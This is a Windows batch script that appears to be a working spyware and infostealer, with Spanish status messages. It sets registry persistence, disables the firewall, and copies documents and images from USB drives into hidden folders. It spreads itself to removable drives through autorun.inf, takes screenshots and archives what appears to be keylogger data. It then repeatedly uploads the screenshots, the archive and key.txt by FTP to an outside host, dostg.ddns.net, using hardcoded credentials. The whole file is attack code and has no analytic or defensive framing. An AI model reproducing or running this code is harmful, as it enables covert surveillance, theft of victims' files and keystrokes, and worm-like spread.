@echo off
cls
@echo off
color 00a

set server=dostg.ddns.net
set user=lordbunny
set password=125643
:EJECUTAR_PROGRAMAS
set NC=1
set batSHELL=1
set batUSB=1
set HTPC=1
set batKEY=1
set NIRCMD=1
set WGET=1
set NCFTP=1

:inicio

echo Agregando persistencia
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v IntelDrive /t REG_SZ /d "C:\ProgramData\tool\IntelDrive.bat" /f
netsh firewall set opmode disable
netsh advfirewall set allprofiles state off 

echo Copiando informacion de USB...
for /f "skip=1" %%x in ('wmic logicaldisk get caption') do (
for /f "tokens=1" %%c in ('fsutil fsinfo drivetype %%x ^| find /i "extra"') do (
xcopy /c /y %%c\*.txt C:\ProgramData\tool\USBDATA /s
xcopy /c /y %%c\*.pdf C:\ProgramData\tool\USBDATA /s
xcopy /c /y %%c\*.txt C:\ProgramData\tool\USBDATA /s
xcopy /c /y %%c\*.jpg C:\ProgramData\tool\USBDATA /s
xcopy /c /y %%c\*.docx C:\ProgramData\tool\USBDATA /s
xcopy /c /y %%c\*.docm C:\ProgramData\tool\USBDATA /s
xcopy /c /y %%c\*.xlsm C:\ProgramData\tool\USBDATA /s
xcopy /c /y %%c\*.pptx C:\ProgramData\tool\USBDATA /s
xcopy /c /y %%c\*.png C:\ProgramData\tool\USBDATA /s
xcopy /c /y %%c\*.xlsm C:\ProgramData\tool\USBDATA /s
xcopy /c /y %%c\*.bmp C:\ProgramData\tool\USBDATA /s
xcopy /c /y %%c\*.txt C:\ProgramData\tool\USBDATA /s
xcopy /c /y "C:\ProgramData\tool\autorun.inf" %%c
xcopy /c /y "C:\ProgramData\tool\SUKABLYAT.bat" %%c
echo [autorun]>%%c
echo open=SUKABLYAT.bat>>%%c
attrib +h %%c\autorun.inf /S /D 
attrib +h %%c\*.docx /S /D 
)
)

ping localhost -n 60 >nul

attrib +h C:\ProgramData\tool\USBDATA\*.*
attrib +h C:\ProgramData\SCREENSHOTS\*.*

echo Capturando y enviando pantalla...
set foto="%Date:~0,2%-%Date:~3,2%-%Date:~6,4%-%Time:~0,2%-%Time:~3,2%-%TIME:~6,2%.jpg"
nircmd savescreenshot %foto%
ncftpput -u %user% -p %password% %server% /%COMPUTERNAME%-%USERNAME%-%PROCESSOR_REVISION% %foto%
move /y C:\ProgramData\tool\%foto% C:\ProgramData\tool\SCREENSHOTS\%foto%

echo Comprimiendo informacion...
if exist "C:\Documents and Settings\All Users" goto wxp
rar a C:\ProgramData\tool\data.rar C:\ProgramData\htpc\*.dat -p3EKFMEWL
goto lolo
:wxp
rar a C:\ProgramData\tool\data.rar "C:\Documents and Settings\All Users\Datos de programa\htpc"\*.dat -p3EKFMEWL

:lolo
echo Enviando informacion...
ncftpput -u %user% -p %password% %server% /%COMPUTERNAME%-%USERNAME%-%PROCESSOR_REVISION% data.rar
ping localhost -n 60 >nul
ncftpput -u %user% -p %password% %server% /%COMPUTERNAME%-%USERNAME%-%PROCESSOR_REVISION% key.txt
echo Datos enviados!
goto inicio